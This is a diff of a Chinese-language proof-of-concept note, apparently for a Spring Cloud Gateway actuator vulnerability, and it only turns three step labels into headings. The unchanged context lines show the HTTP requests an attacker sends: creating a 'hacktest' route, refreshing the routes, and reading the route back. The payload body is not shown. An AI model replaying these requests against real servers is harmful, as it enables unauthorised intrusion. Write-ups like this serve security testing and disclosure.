@@ -5,7 +5,7 @@
 ***默认路径 gateway 在页面 ../actuator 可访问***
 
 ## POC
-创建路由
+### 创建路由
 ```
 POST /actuator/gateway/routes/hacktest HTTP/1.1
 Host:  XXX
@@ -33,7 +33,7 @@ Content-Length: 333
 
 ![alt text](photos/image7.png)
 
-主动刷新路由
+### 主动刷新路由
 ```
 POST /actuator/gateway/refresh HTTP/1.1
 Host: XXX
@@ -55,7 +55,7 @@ a=1
 
 ![alt text](photos/image8.png)
 
-通过自定义id获取路由
+### 通过自定义id获取路由
 ```
 GET /actuator/gateway/routes/hacktest HTTP/1.1
 Host: XXX
